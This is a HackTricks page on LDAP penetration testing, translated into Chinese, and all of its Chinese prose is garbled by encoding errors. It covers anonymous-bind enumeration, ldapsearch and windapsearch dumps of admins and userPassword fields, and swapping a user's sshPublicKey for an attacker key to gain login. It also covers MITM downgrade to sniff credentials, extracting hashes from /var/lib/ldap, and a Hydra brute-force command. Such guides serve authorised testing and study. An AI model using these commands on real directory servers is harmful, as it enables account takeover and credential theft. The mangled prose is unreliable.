# 389, 636, 3268, 3269 - LDAPæ¸—é€æµ‹è¯•

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* å¦‚æœä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œï¼Œæƒ³åœ¨**HackTricks**ä¸Šçœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**ï¼Œæˆ–è€…æƒ³è¦è·å–**PEASSæœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTs**](https://opensea.io/collection/the-peass-family)ç³»åˆ—ã€‚
* è·å–[**å®˜æ–¹çš„PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)ã€‚
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**telegramç¾¤ç»„**](https://t.me/peass)æˆ–åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricksä»“åº“**](https://github.com/carlospolop/hacktricks) **å’Œ** [**hacktricks-cloudä»“åº“**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## åŸºæœ¬ä¿¡æ¯

æ‘˜è‡ªï¼š[https://searchmobilecomputing.techtarget.com/definition/LDAP](https://searchmobilecomputing.techtarget.com/definition/LDAP)

LDAPï¼ˆè½»é‡çº§ç›®å½•è®¿é—®åè®®ï¼‰æ˜¯ä¸€ç§è½¯ä»¶åè®®ï¼Œç”¨äºä½¿ä»»ä½•äººéƒ½èƒ½å¤Ÿåœ¨ç½‘ç»œä¸­**å®šä½**ç»„ç»‡ã€ä¸ªäººå’Œå…¶ä»–**èµ„æº**ï¼Œå¦‚æ–‡ä»¶å’Œè®¾å¤‡ï¼Œæ— è®ºæ˜¯åœ¨å…¬å…±äº’è”ç½‘ä¸Šè¿˜æ˜¯åœ¨ä¼ä¸šå†…ç½‘ä¸Šã€‚LDAPæ˜¯Directory Access Protocolï¼ˆDAPï¼‰çš„"è½»é‡çº§"ï¼ˆä»£ç é‡æ›´å°‘ï¼‰ç‰ˆæœ¬ã€‚

ä¸€ä¸ªLDAPç›®å½•å¯ä»¥åœ¨è®¸å¤šæœåŠ¡å™¨ä¹‹é—´**åˆ†å¸ƒ**ã€‚æ¯ä¸ªæœåŠ¡å™¨éƒ½å¯ä»¥æœ‰ä¸€ä¸ªæ€»ç›®å½•çš„**å¤åˆ¶**ç‰ˆæœ¬ï¼Œè¯¥ç‰ˆæœ¬ä¼šå®šæœŸè¿›è¡Œ**åŒæ­¥**ã€‚ä¸€ä¸ªLDAPæœåŠ¡å™¨è¢«ç§°ä¸ºç›®å½•ç³»ç»Ÿä»£ç†ï¼ˆDSAï¼‰ã€‚æ¥æ”¶åˆ°ç”¨æˆ·è¯·æ±‚çš„LDAPæœåŠ¡å™¨è´Ÿè´£è¯¥è¯·æ±‚ï¼Œå¿…è¦æ—¶å°†å…¶ä¼ é€’ç»™å…¶ä»–DSAï¼Œä½†ç¡®ä¿ä¸ºç”¨æˆ·æä¾›ä¸€ä¸ªåè°ƒçš„å•ä¸€å“åº”ã€‚

ä¸€ä¸ªLDAPç›®å½•åœ¨ç»„ç»‡ä¸Šæ˜¯ä¸€ä¸ªç®€å•çš„"æ ‘"å±‚æ¬¡ç»“æ„ï¼ŒåŒ…æ‹¬ä»¥ä¸‹çº§åˆ«ï¼š

* æ ¹ç›®å½•ï¼ˆæ ‘çš„èµ·ç‚¹æˆ–æºå¤´ï¼‰ï¼Œå®ƒåˆ†æ”¯å‡ºå»åˆ°
* å„ä¸ªå›½å®¶ï¼Œæ¯ä¸ªå›½å®¶åˆåˆ†æ”¯å‡ºå»åˆ°
* ç»„ç»‡ï¼Œå®ƒä»¬åˆåˆ†æ”¯å‡ºå»åˆ°
* ç»„ç»‡å•ä½ï¼ˆéƒ¨é—¨ã€éƒ¨é—¨ç­‰ï¼‰ï¼Œå®ƒä»¬åˆåˆ†æ”¯å‡ºå»åˆ°ï¼ˆåŒ…æ‹¬æ¡ç›®ï¼‰
* ä¸ªäººï¼ˆåŒ…æ‹¬äººå‘˜ã€æ–‡ä»¶å’Œå…±äº«èµ„æºï¼Œå¦‚æ‰“å°æœºï¼‰

**é»˜è®¤ç«¯å£ï¼š**389å’Œ636ï¼ˆldapsï¼‰ã€‚å…¨å±€ç›®å½•ï¼ˆActiveDirectoryä¸­çš„LDAPï¼‰é»˜è®¤åœ¨ç«¯å£3268å’Œ3269ä¸Šå¯ç”¨äºLDAPSã€‚
```
PORT    STATE SERVICE REASON
389/tcp open  ldap    syn-ack
636/tcp open  tcpwrapped
```
### LDAP æ•°æ®äº¤æ¢æ ¼å¼

LDIFï¼ˆLDAP æ•°æ®äº¤æ¢æ ¼å¼ï¼‰å°†ç›®å½•å†…å®¹å®šä¹‰ä¸ºä¸€ç»„è®°å½•ã€‚å®ƒè¿˜å¯ä»¥è¡¨ç¤ºæ›´æ–°è¯·æ±‚ï¼ˆæ·»åŠ ã€ä¿®æ”¹ã€åˆ é™¤ã€é‡å‘½åï¼‰ã€‚
```bash
dn: dc=local
dc: local
objectClass: dcObject

dn: dc=moneycorp,dc=local
dc: moneycorp
objectClass: dcObject
objectClass: organization

dn ou=it,dc=moneycorp,dc=local
objectClass: organizationalUnit
ou: dev

dn: ou=marketing,dc=moneycorp,dc=local
objectClass: organizationalUnit
Ou: sales

dn: cn= ,ou= ,dc=moneycorp,dc=local
objectClass: personalData
cn:
sn:
gn:
uid:
ou:
mail: pepe@hacktricks.xyz
phone: 23627387495
```
* ç¬¬1-3è¡Œå®šä¹‰äº†é¡¶çº§åŸŸlocal
* ç¬¬5-8è¡Œå®šä¹‰äº†ä¸€çº§åŸŸmoneycorpï¼ˆmoneycorp.localï¼‰
* ç¬¬10-16è¡Œå®šä¹‰äº†ä¸¤ä¸ªç»„ç»‡å•ä½ï¼šdevå’Œsales
* ç¬¬18-26è¡Œåˆ›å»ºäº†ä¸€ä¸ªåŸŸå¯¹è±¡å¹¶ä¸ºå…¶åˆ†é…äº†å¸¦æœ‰å€¼çš„å±æ€§

## å†™å…¥æ•°æ®

è¯·æ³¨æ„ï¼Œå¦‚æœæ‚¨å¯ä»¥ä¿®æ”¹å€¼ï¼Œæ‚¨å¯èƒ½èƒ½å¤Ÿæ‰§è¡Œä¸€äº›éå¸¸æœ‰è¶£çš„æ“ä½œã€‚ä¾‹å¦‚ï¼Œæƒ³è±¡ä¸€ä¸‹ï¼Œå¦‚æœæ‚¨**å¯ä»¥æ›´æ”¹ç”¨æˆ·æˆ–ä»»ä½•ç”¨æˆ·çš„"sshPublicKey"ä¿¡æ¯**ã€‚å¦‚æœè¿™ä¸ªå±æ€§å­˜åœ¨ï¼Œé‚£ä¹ˆå¾ˆæœ‰å¯èƒ½**sshæ­£åœ¨ä»LDAPè¯»å–å…¬é’¥**ã€‚å¦‚æœæ‚¨å¯ä»¥ä¿®æ”¹ç”¨æˆ·çš„å…¬é’¥ï¼Œå³ä½¿åœ¨sshä¸­æ²¡æœ‰å¯ç”¨å¯†ç è®¤è¯ï¼Œæ‚¨**ä¹Ÿå°†èƒ½å¤Ÿä»¥è¯¥ç”¨æˆ·èº«ä»½ç™»å½•**ã€‚
```bash
>>> import ldap3
>>> server = ldap3.Server('x.x.x.x', port =636, use_ssl = True)
>>> connection = ldap3.Connection(server, 'uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN', 'PASSWORD', auto_bind=True)
>>> connection.bind()
True
>>> connection.extend.standard.who_am_i()
u'dn:uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN'
>>> connection.modify('uid=USER,ou=USERS,dc=DOMAINM=,dc=DOMAIN',{'sshPublicKey': [(ldap3.MODIFY_REPLACE, ['ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHRMu2et/B5bUyHkSANn2um9/qtmgUTEYmV9cyK1buvrS+K2gEKiZF5pQGjXrT71aNi5VxQS7f+s3uCPzwUzlI2rJWFncueM1AJYaC00senG61PoOjpqlz/EUYUfj6EUVkkfGB3AUL8z9zd2Nnv1kKDBsVz91o/P2GQGaBX9PwlSTiR8OGLHkp2Gqq468QiYZ5txrHf/l356r3dy/oNgZs7OWMTx2Rr5ARoeW5fwgleGPy6CqDN8qxIWntqiL1Oo4ulbts8OxIU9cVsqDsJzPMVPlRgDQesnpdt4cErnZ+Ut5ArMjYXR2igRHLK7atZH/qE717oXoiII3UIvFln2Ivvd8BRCvgpo+98PwN8wwxqV7AWo0hrE6dqRI7NC4yYRMvf7H8MuZQD5yPh2cZIEwhpk7NaHW0YAmR/WpRl4LbT+o884MpvFxIdkN1y1z+35haavzF/TnQ5N898RcKwll7mrvkbnGrknn+IT/v3US19fPJWzl1/pTqmAnkPThJW/k= badguy@evil'])]})
```
## å—…æ¢æ˜æ–‡å‡­è¯

å¦‚æœLDAPæœªä½¿ç”¨SSLï¼Œä½ å¯ä»¥åœ¨ç½‘ç»œä¸­**å—…æ¢æ˜æ–‡å‡­è¯**ã€‚

æ­¤å¤–ï¼Œä½ å¯ä»¥åœ¨**LDAPæœåŠ¡å™¨å’Œå®¢æˆ·ç«¯ä¹‹é—´**çš„ç½‘ç»œä¸­æ‰§è¡Œ**MITM**æ”»å‡»ã€‚åœ¨è¿™é‡Œï¼Œä½ å¯ä»¥è¿›è¡Œ**é™çº§æ”»å‡»**ï¼Œä½¿å®¢æˆ·ç«¯ä½¿ç”¨**æ˜æ–‡å‡­è¯**ç™»å½•ã€‚

**å¦‚æœä½¿ç”¨äº†SSL**ï¼Œä½ å¯ä»¥å°è¯•æ‰§è¡Œä¸Šè¿°çš„**MITM**æ”»å‡»ï¼Œä½†æä¾›ä¸€ä¸ª**å‡è¯ä¹¦**ï¼Œå¦‚æœ**ç”¨æˆ·æ¥å—äº†å®ƒ**ï¼Œä½ å°±èƒ½é™çº§è®¤è¯æ–¹æ³•å¹¶å†æ¬¡çœ‹åˆ°å‡­è¯ã€‚

## åŒ¿åè®¿é—®

### ç»•è¿‡TLS SNIæ£€æŸ¥

æ ¹æ®[**è¿™ç¯‡æ–‡ç« **](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)ï¼Œä»…é€šè¿‡ä½¿ç”¨ä»»æ„åŸŸåï¼ˆå¦‚company.comï¼‰è®¿é—®LDAPæœåŠ¡å™¨ï¼Œä½œè€…èƒ½å¤Ÿä½œä¸ºåŒ¿åç”¨æˆ·è”ç³»LDAPæœåŠ¡å¹¶æå–ä¿¡æ¯ï¼š
```bash
ldapsearch -H ldaps://company.com:636/ -x -s base -b '' "(objectClass=*)" "*" +
```
### LDAPåŒ¿åç»‘å®š

[LDAPåŒ¿åç»‘å®š](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/anonymous-ldap-operations-active-directory-disabled)å…è®¸**æœªç»è®¤è¯çš„æ”»å‡»è€…**æ£€ç´¢åŸŸä¸­çš„ä¿¡æ¯ï¼Œä¾‹å¦‚ç”¨æˆ·ã€ç»„ã€è®¡ç®—æœºçš„å®Œæ•´åˆ—è¡¨ï¼Œç”¨æˆ·è´¦æˆ·å±æ€§ï¼Œä»¥åŠåŸŸå¯†ç ç­–ç•¥ã€‚è¿™æ˜¯ä¸€ç§**é—ç•™é…ç½®**ï¼Œè‡ªWindows Server 2003èµ·ï¼Œåªæœ‰ç»è¿‡è®¤è¯çš„ç”¨æˆ·æ‰è¢«å…è®¸å‘èµ·LDAPè¯·æ±‚ã€‚\
ç„¶è€Œï¼Œç®¡ç†å‘˜å¯èƒ½éœ€è¦**ä¸ºç‰¹å®šåº”ç”¨ç¨‹åºè®¾ç½®å…è®¸åŒ¿åç»‘å®š**ï¼Œå¹¶ä¸”æ— æ„ä¸­æä¾›äº†è¶…å‡ºé¢„æœŸçš„è®¿é—®æƒé™ï¼Œä»è€Œä½¿æœªç»è®¤è¯çš„ç”¨æˆ·èƒ½å¤Ÿè®¿é—®ADä¸­çš„æ‰€æœ‰å¯¹è±¡ã€‚

## æœ‰æ•ˆå‡­è¯

å¦‚æœæ‚¨æ‹¥æœ‰ç™»å½•LDAPæœåŠ¡å™¨çš„æœ‰æ•ˆå‡­è¯ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å·¥å…·å¯¼å‡ºæœ‰å…³åŸŸç®¡ç†å‘˜çš„æ‰€æœ‰ä¿¡æ¯ï¼š

[ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)
```bash
pip3 install ldapdomaindump
ldapdomaindump <IP> [-r <IP>] -u '<domain>\<username>' -p '<password>' [--authtype SIMPLE] --no-json --no-grep [-o /path/dir]
```
### [æš´åŠ›ç ´è§£](../generic-methodologies-and-resources/brute-force.md#ldap)

## æšä¸¾

### è‡ªåŠ¨åŒ–

ä½¿ç”¨æ­¤æ–¹æ³•ï¼Œæ‚¨å°†èƒ½å¤ŸæŸ¥çœ‹**å…¬å…±ä¿¡æ¯**ï¼ˆå¦‚åŸŸåï¼‰**ï¼š**
```bash
nmap -n -sV --script "ldap* and not brute" <IP> #Using anonymous credentials
```
### Python

<details>

<summary>æŸ¥çœ‹ä½¿ç”¨ Python è¿›è¡Œ LDAP æšä¸¾</summary>

æ‚¨å¯ä»¥å°è¯•**ä½¿ç”¨æˆ–ä¸ä½¿ç”¨å‡­è¯é€šè¿‡ Python æšä¸¾ LDAP**ï¼š`pip3 install ldap3`

é¦–å…ˆå°è¯•**ä¸ä½¿ç”¨**å‡­è¯è¿æ¥ï¼š
```bash
>>> import ldap3
>>> server = ldap3.Server('x.X.x.X', get_info = ldap3.ALL, port =636, use_ssl = True)
>>> connection = ldap3.Connection(server)
>>> connection.bind()
True
>>> server.info
```
å¦‚æœå“åº”æ˜¯`True`ï¼Œå¦‚å‰é¢çš„ä¾‹å­æ‰€ç¤ºï¼Œä½ å¯ä»¥ä»ä»¥ä¸‹ä½ç½®è·å–LDAPï¼ˆå¦‚**å‘½åä¸Šä¸‹æ–‡**æˆ–**åŸŸå**ï¼‰æœåŠ¡å™¨çš„ä¸€äº›**æœ‰è¶£æ•°æ®**ï¼š
```bash
>>> server.info
DSA info (from DSE):
Supported LDAP versions: 3
Naming contexts:
dc=DOMAIN,dc=DOMAIN
```
```markdown
ä¸€æ—¦ä½ æœ‰äº†å‘½åä¸Šä¸‹æ–‡ï¼Œä½ å°±å¯ä»¥è¿›è¡Œä¸€äº›æ›´åŠ ä»¤äººå…´å¥‹çš„æŸ¥è¯¢ã€‚è¿™ä¸ªç®€å•çš„æŸ¥è¯¢åº”è¯¥ä¼šæ˜¾ç¤ºç›®å½•ä¸­çš„æ‰€æœ‰å¯¹è±¡ï¼š
```
```bash
>>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=*))', search_scope='SUBTREE', attributes='*')
True
>> connection.entries
```
æˆ–è€…**å¯¼å‡º**æ•´ä¸ªldapï¼š
```bash
>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=person))', search_scope='SUBTREE', attributes='userPassword')
True
>>> connection.entries
```
</details>

### windapsearch

[**Windapsearch**](https://github.com/ropnop/windapsearch) \*\*\*\* æ˜¯ä¸€ä¸ª Python è„šæœ¬ï¼Œé€šè¿‡ä½¿ç”¨ LDAP æŸ¥è¯¢ï¼Œå¯ä»¥æœ‰æ•ˆåœ°ä» Windows åŸŸä¸­**æšä¸¾ç”¨æˆ·ã€ç»„å’Œè®¡ç®—æœº**ã€‚
```bash
# Get computers
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --computers
# Get groups
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --groups
# Get users
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --da
# Get Domain Admins
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --da
# Get Privileged Users
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --privileged-users
```
### ldapsearch

æ£€æŸ¥ç©ºå‡­è¯æˆ–æ‚¨çš„å‡­è¯æ˜¯å¦æœ‰æ•ˆï¼š
```bash
ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
```

```bash
# CREDENTIALS NOT VALID RESPONSE
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A4C, comment: In order to perform this opera
tion a successful bind must be completed on the connection., data 0, v3839
```
å¦‚æœä½ å‘ç°æŸäº›å†…å®¹æ˜¾ç¤ºâ€œ_bind must be completed_â€æ„å‘³ç€å‡­è¯ä¸æ­£ç¡®ã€‚

ä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•ä»ä¸€ä¸ªåŸŸä¸­æå–**æ‰€æœ‰ä¿¡æ¯**ï¼š
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
-x Simple Authentication
-H LDAP Server
-D My User
-w My password
-b Base site, all data from here will be given
```
æå–**ç”¨æˆ·**ï¼š
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
#Example: ldapsearch -x -H ldap://<IP> -D 'MYDOM\john' -w 'johnpassw' -b "CN=Users,DC=mydom,DC=local"
```
æå–**computers**ï¼š
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Computers,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
æå–**æˆ‘çš„ä¿¡æ¯**ï¼š
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=<MY NAME>,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
æå– **Domain Admins**ï¼š
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
æå–**åŸŸç”¨æˆ·**ï¼š
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Users,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
æå– **Enterprise Admins**ï¼š
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Enterprise Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
æå–**ç®¡ç†å‘˜**ï¼š
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Administrators,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
æå– **Remote Desktop Group**ï¼š
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Remote Desktop Users,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
è¦æŸ¥çœ‹æ‚¨æ˜¯å¦æœ‰æƒè®¿é—®ä»»ä½•å¯†ç ï¼Œæ‚¨å¯ä»¥åœ¨æ‰§è¡Œå…¶ä¸­ä¸€ä¸ªæŸ¥è¯¢åä½¿ç”¨ grepï¼š
```bash
<ldapsearchcmd...> | grep -i -A2 -B2 "userpas"
```
è¯·æ³¨æ„ï¼Œæ‚¨åœ¨è¿™é‡Œæ‰¾åˆ°çš„å¯†ç å¯èƒ½ä¸æ˜¯çœŸå®çš„å¯†ç ...

#### pbis

æ‚¨å¯ä»¥ä»è¿™é‡Œä¸‹è½½ **pbis**ï¼š[https://github.com/BeyondTrust/pbis-open/](https://github.com/BeyondTrust/pbis-open/)ï¼Œé€šå¸¸å®‰è£…åœ¨ `/opt/pbis`ã€‚\
**Pbis** å…è®¸æ‚¨è½»æ¾è·å–åŸºæœ¬ä¿¡æ¯ï¼š
```bash
#Read keytab file
./klist -k /etc/krb5.keytab

#Get known domains info
./get-status
./lsa get-status

#Get basic metrics
./get-metrics
./lsa get-metrics

#Get users
./enum-users
./lsa enum-users

#Get groups
./enum-groups
./lsa enum-groups

#Get all kind of objects
./enum-objects
./lsa enum-objects

#Get groups of a user
./list-groups-for-user <username>
./lsa list-groups-for-user <username>
#Get groups of each user
./enum-users | grep "Name:" | sed -e "s,\\\,\\\\\\\,g" | awk '{print $2}' | while read name; do ./list-groups-for-user "$name"; echo -e "========================\n"; done

#Get users of a group
./enum-members --by-name "domain admins"
./lsa enum-members --by-name "domain admins"
#Get users of each group
./enum-groups | grep "Name:" | sed -e "s,\\\,\\\\\\\,g" | awk '{print $2}' | while read name; do echo "$name"; ./enum-members --by-name "$name"; echo -e "========================\n"; done

#Get description of each user
./adtool -a search-user --name CN="*" --keytab=/etc/krb5.keytab -n <Username> | grep "CN" | while read line; do
echo "$line";
./adtool --keytab=/etc/krb5.keytab -n <username> -a lookup-object --dn="$line" --attr "description";
echo "======================"
done
```
## å›¾å½¢ç•Œé¢

### Apache Directory

[**ä»è¿™é‡Œä¸‹è½½ Apache Directory**](https://directory.apache.org/studio/download/download-linux.html)ã€‚ä½ å¯ä»¥åœ¨[è¿™é‡Œæ‰¾åˆ°å¦‚ä½•ä½¿ç”¨è¿™ä¸ªå·¥å…·çš„ç¤ºä¾‹](https://www.youtube.com/watch?v=VofMBg2VLnw\&t=3840s)ã€‚

### jxplorer

ä½ å¯ä»¥åœ¨è¿™é‡Œä¸‹è½½å¸¦æœ‰ LDAP æœåŠ¡å™¨çš„å›¾å½¢ç•Œé¢ï¼š[http://www.jxplorer.org/downloads/users.html](http://www.jxplorer.org/downloads/users.html)

é»˜è®¤å®‰è£…åœ¨ï¼š_/opt/jxplorer_

![](<../.gitbook/assets/image (22) (1).png>)

### Godap

ä½ å¯ä»¥åœ¨[https://github.com/Macmod/godap](https://github.com/Macmod/godap)è®¿é—®å®ƒ

## é€šè¿‡ kerberos è¿›è¡Œè®¤è¯

ä½¿ç”¨ `ldapsearch`ï¼Œä½ å¯ä»¥é€šè¿‡ `-Y GSSAPI` å‚æ•°**ä½¿ç”¨ kerberos è¿›è¡Œè®¤è¯**ï¼Œè€Œä¸æ˜¯é€šè¿‡ **NTLM**

## POST

å¦‚æœä½ èƒ½è®¿é—®åŒ…å«æ•°æ®åº“çš„æ–‡ä»¶ï¼ˆå¯èƒ½åœ¨ _/var/lib/ldap_ ä¸­ï¼‰ã€‚ä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•æå–å“ˆå¸Œï¼š
```bash
cat /var/lib/ldap/*.bdb | grep -i -a -E -o "description.*" | sort | uniq -u
```
æ‚¨å¯ä»¥å°†å¯†ç å“ˆå¸Œï¼ˆä» '{SSHA}' åˆ° 'structural'ï¼Œä¸æ·»åŠ  'structural'ï¼‰æä¾›ç»™johnã€‚

### é…ç½®æ–‡ä»¶

* é€šç”¨
* containers.ldif
* ldap.cfg
* ldap.conf
* ldap.xml
* ldap-config.xml
* ldap-realm.xml
* slapd.conf
* IBM SecureWay V3 æœåŠ¡å™¨
* V3.sas.oc
* Microsoft Active Directory æœåŠ¡å™¨
* msadClassesAttrs.ldif
* Netscape Directory Server 4
* nsslapd.sas\_at.conf
* nsslapd.sas\_oc.conf
* OpenLDAP ç›®å½•æœåŠ¡å™¨
* slapd.sas\_at.conf
* slapd.sas\_oc.conf
* Sun ONE Directory Server 5.1
* 75sas.ldif

## HackTricks è‡ªåŠ¨å‘½ä»¤
```
Protocol_Name: LDAP    #Protocol Abbreviation if there is one.
Port_Number:  389,636     #Comma separated if there is more than one.
Protocol_Description: Lightweight Directory Access Protocol         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for LDAP
Note: |
LDAP (Lightweight Directory Access Protocol) is a software protocol for enabling anyone to locate organizations, individuals, and other resources such as files and devices in a network, whether on the public Internet or on a corporate intranet. LDAP is a "lightweight" (smaller amount of code) version of Directory Access Protocol (DAP).

https://book.hacktricks.xyz/pentesting/pentesting-ldap

Entry_2:
Name: Banner Grab
Description: Grab LDAP Banner
Command: nmap -p 389 --script ldap-search -Pn {IP}

Entry_3:
Name: LdapSearch
Description: Base LdapSearch
Command: ldapsearch -H ldap://{IP} -x

Entry_4:
Name: LdapSearch Naming Context Dump
Description: Attempt to get LDAP Naming Context
Command: ldapsearch -H ldap://{IP} -x -s base namingcontexts

Entry_5:
Name: LdapSearch Big Dump
Description: Need Naming Context to do big dump
Command: ldapsearch -H ldap://{IP} -x -b "{Naming_Context}"

Entry_6:
Name: Hydra Brute Force
Description: Need User
Command: hydra -l {Username} -P {Big_Passwordlist} {IP} ldap2 -V -f
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* æ‚¨æ˜¯å¦åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œï¼Ÿæ‚¨æ˜¯å¦å¸Œæœ›åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**ï¼Ÿæˆ–è€…æ‚¨æ˜¯å¦æƒ³è¦è®¿é—®**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä»¥PDFæ ¼å¼ä¸‹è½½HackTricks**ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsé›†åˆ**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**telegramç¾¤ç»„**](https://t.me/peass)æˆ–åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricksä»“åº“**](https://github.com/carlospolop/hacktricks) **å’Œ** [**hacktricks-cloudä»“åº“**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
